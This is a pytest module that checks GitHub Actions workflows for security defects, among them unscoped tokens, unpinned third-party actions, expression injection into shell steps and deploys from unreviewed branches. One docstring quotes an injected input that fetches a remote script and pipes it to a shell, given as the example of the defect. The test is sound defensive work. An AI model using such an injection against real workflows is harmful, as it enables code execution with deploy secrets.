"""Rules the GitHub Actions workflows have to keep.

Every one of these pins a defect that was live in `.github/workflows/deploy.yml`. They are
worth having as tests rather than as review habits for the same reason the deploy checks
themselves exist: a workflow is edited rarely, under time pressure, by whoever is holding the
release, and none of these failures is visible in the run that introduces them. A moving action
ref and an injectable `run:` block both look exactly like a working deploy.

Nothing here talks to GitHub. The workflow files are the whole input.
"""

import re
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = sorted((ROOT / ".github" / "workflows").glob("*.yml"))
DEPLOY = ROOT / ".github" / "workflows" / "deploy.yml"

#: Actions published by GitHub itself. Everything else is somebody else's repository, and a
#: tag or a branch there is a name they can repoint at any commit, at any time, with no change
#: landing here for anyone to review.
FIRST_PARTY = ("actions/", "github/")

_SHA = re.compile(r"^[0-9a-f]{40}$")


def load(path):
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def steps_of(document):
    for job in (document.get("jobs") or {}).values():
        for step in job.get("steps") or []:
            yield step


def test_there_are_workflows_to_check():
    assert WORKFLOWS, "no workflow files found; every test in this module would pass vacuously"


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_every_workflow_declares_its_token_scope(path):
    """No `permissions:` block means the repository's default scope, whatever that is.

    That default is an organisation setting nothing in this repository can see, and on many
    repositories it is write access to contents, packages, issues and pull requests -- handed
    to every step of the job, including third-party actions and, on `pull_request`, a job that
    has just executed code from a contributor's branch.
    """
    document = load(path)
    permissions = document.get("permissions")
    assert permissions is not None, (
        f"{path.name} declares no permissions, so it runs with the repository default token "
        "scope -- a setting this file cannot see and did not choose"
    )
    assert permissions == {"contents": "read"} or permissions == "read-all", (
        f"{path.name} asks for more than it needs: {permissions!r}"
    )


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_third_party_actions_are_pinned_to_a_commit(path):
    """A third-party action on a tag or a branch is code that changes with no diff to review.

    `superfly/flyctl-actions/setup-flyctl@master` downloaded whatever that repository held at
    dispatch time and put a binary on PATH -- and the very next step ran that binary with the
    production deploy token in its environment.
    """
    for step in steps_of(load(path)):
        uses = step.get("uses")
        if not uses or uses.startswith(FIRST_PARTY):
            continue
        assert "@" in uses, f"{path.name}: `{uses}` names no ref at all"
        ref = uses.rsplit("@", 1)[1]
        assert _SHA.match(ref), (
            f"{path.name}: `{uses}` is pinned to a moving ref. A third-party action must name "
            "a full 40-character commit SHA, so that changing what runs here is a change "
            "somebody makes to this file"
        )


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda path: path.name)
def test_no_expression_is_interpolated_into_a_shell_script(path):
    """`${{ }}` in a `run:` block is substituted as TEXT before the shell parses it.

    A `reason` of `"; curl evil.sh | sh; #` therefore ran, in a job holding the production
    deploy token, on a summary step marked `if: always()` that could not be skipped by failing
    earlier. Values belong in `env:` and are read as quoted shell variables, where they are
    data whatever they contain.

    The rule is EVERY expression, not only the ones that are attacker-controlled today.
    Deciding per-expression which contexts are safe is a judgement that has to be re-made
    correctly on every edit; "none, ever" is one a reader can check at a glance.
    """
    for step in steps_of(load(path)):
        script = step.get("run")
        if not script:
            continue
        assert "${{" not in script, (
            f"{path.name}: step {step.get('name', step.get('uses'))!r} interpolates an "
            "expression into its shell script. Pass it through `env:` and read it as a quoted "
            f"shell variable instead:\n{script.strip()[:300]}"
        )


def test_the_deploy_refuses_to_run_off_main():
    """`workflow_dispatch` offers a branch picker, and nothing checked which one was chosen.

    A dispatch from any branch deployed that branch -- and it did not even look wrong
    afterwards, because the post-deploy check compares `/version` against `github.sha`, which
    is that same branch's commit. The run went green over a host serving code that had never
    passed review.

    The guard has to come before the checkout: everything after it runs the dispatched ref's
    own files, the Dockerfile and fly.toml that flyctl builds from above all.
    """
    steps = list(steps_of(load(DEPLOY)))
    guards = [
        index for index, step in enumerate(steps)
        if "refs/heads/main" in (step.get("run") or "")
    ]
    assert guards, "nothing asserts the run is on main; a dispatch from any branch deploys it"

    checkouts = [
        index for index, step in enumerate(steps)
        if (step.get("uses") or "").startswith("actions/checkout")
    ]
    assert checkouts, "no checkout step; this ordering check is pinning nothing"
    assert min(guards) < min(checkouts), (
        "the ref guard runs after the checkout, so the dispatched branch's own files are "
        "already on disk before anything asks which branch this is"
    )


#: What a phone needs to install and open the app. `/app` answering 200 beside a broken
#: manifest is a page that opens in Safari and cannot be added to a home screen; a broken
#: service worker is a page that needs signal. Both fail on a phone, at the venue, which is
#: the one place nobody is watching a CI log.
PHONE_INSTALL_PATHS = ("/health", "/app", "/app-icon.png", "/app-manifest.json", "/app-sw.js")


def test_the_smoke_check_covers_what_the_phone_install_needs():
    smoke = [
        step for step in steps_of(load(DEPLOY))
        if "http_code" in (step.get("run") or "")
    ]
    assert smoke, "no post-deploy smoke step; a green run says only that Fly took the image"
    script = "\n".join(step["run"] for step in smoke)
    for path in PHONE_INSTALL_PATHS:
        assert path in script, f"the post-deploy smoke check never asks for {path}"
